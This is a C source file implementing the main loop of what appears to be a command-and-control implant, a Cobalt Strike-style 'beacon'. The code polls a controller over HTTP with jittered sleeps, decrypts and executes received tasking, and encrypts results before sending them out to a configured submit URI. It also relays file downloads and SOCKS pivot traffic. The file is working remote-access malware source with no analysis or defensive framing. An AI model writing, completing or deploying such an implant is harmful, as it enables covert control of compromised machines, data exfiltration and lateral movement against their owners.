#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "files.h"
#include "pivot.h"
#include "parse.h"
#include "security.h"
#include "debug.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

extern sessdata bigsession;
extern unsigned int agentid;

void agent_init(char *buffer, unsigned int max);

unsigned int sleep_time = 60000;
unsigned int jitter     = 0;
static int callbacks_enabled = 0;

char *command_shell_encrypt(char *buffer, int length, int type, unsigned int *result_len) {
    builder b;
    char *cipherdata;
    int len;

    cipherdata = (char *)malloc((size_t)length + 32 + HMAC_SIZE + 16);
    if (!cipherdata) {
        *result_len = 0;
        return NULL;
    }
    build_init(&b, cipherdata, length + 32 + HMAC_SIZE + 16);
    build_add_int(&b, (uint32_t)type);
    build_add_data(&b, buffer, length);
    len = build_length(&b);
    if (len <= 0) {
        free(cipherdata);
        *result_len = 0;
        return NULL;
    }
    *result_len = (unsigned int)security_encrypt(cipherdata, len);
    return cipherdata;
}

void command_shell_callback(char *buffer, int length, int type) {
    unsigned int rlen = 0;
    char *cipher;
    char *submit;

    if (!callbacks_enabled && type != CALLBACK_DEAD)
        return;

    cipher = command_shell_encrypt(buffer, length, type, &rlen);
    if (!cipher || rlen == 0) return;
    submit = setting_ptr(SETTING_SUBMITURI);
    http_put(submit, cipher, (int)rlen, 0);
    free(cipher);
}

void process_payload(char *buffer, unsigned int length) {
    datap parser;
    unsigned int type, size;
    char *entry;

    data_init(&parser, buffer, (int)length);
    while (data_length(&parser) >= 8) {
        type = data_int(&parser);
        size = data_int(&parser);
        entry = data_ptr(&parser, (int)size);
        if (!entry && size > 0) break;
        process_message(type, entry, (int)size);
    }
}

static void beacon_sleep_ms(unsigned int ms) {
    unsigned int adjust = 0;
    unsigned int sx;
    if (ms == 0) return;
    if (jitter > 0 && jitter < 100) {
        sx = (ms * jitter) / 100;
        if (sx > 0) adjust = bigger_rand() % (sx + 1);
        if (adjust < ms) ms -= adjust;
    }
    usleep(ms * 1000u);
}

void beacon_main(void) {
    char *buffer;
    int length;
    unsigned int maxget;
    char scratch[512];
    char *submit;
    http_response_t resp;

    settings_init();
    build_reset_nonce();

    sleep_time = setting_int(SETTING_SLEEPTIME);
    if (sleep_time == 0) sleep_time = 60000;
    jitter = setting_short(SETTING_JITTER);
    maxget = setting_int(SETTING_MAXGET);
    if (maxget < 1024) maxget = 1024 * 1024;

    agent_init(scratch, sizeof(scratch));
    pivot_init();

    buffer = (char *)malloc(maxget);
    if (!buffer) return;

    DEBUG_PRINT("[beacon] start agent=%u sleep=%u jitter=%u\n",
                agentid, sleep_time, jitter);

    while (sleep_time > 0) {
        callbacks_enabled = 0;
        memset(buffer, 0, maxget);
        memset(&resp, 0, sizeof(resp));

        if (channel_http_get(NULL, &bigsession, &resp) == 0) {
            if (resp.data && resp.size > 0 && (size_t)resp.size <= maxget) {
                memcpy(buffer, resp.data, resp.size);
                length = security_decrypt(buffer, (int)resp.size);
                if (length > 0) {
                    callbacks_enabled = 1;
                    process_payload(buffer, (unsigned int)length);
                }
            }
            /* Allow download chunks + SOCKS I/O after a successful GET */
            callbacks_enabled = 1;
            files_download_poll(256 * 1024);
            pivot_poll((pivot_callback)command_shell_callback);
        } else {
            DEBUG_PRINT("[beacon] check-in failed\n");
        }
        http_response_free(&resp);

        submit = setting_ptr(SETTING_SUBMITURI);
        http_post_flush(submit);
        beacon_sleep_ms(sleep_time);
    }

    pivot_cleanup();
    free(buffer);
}
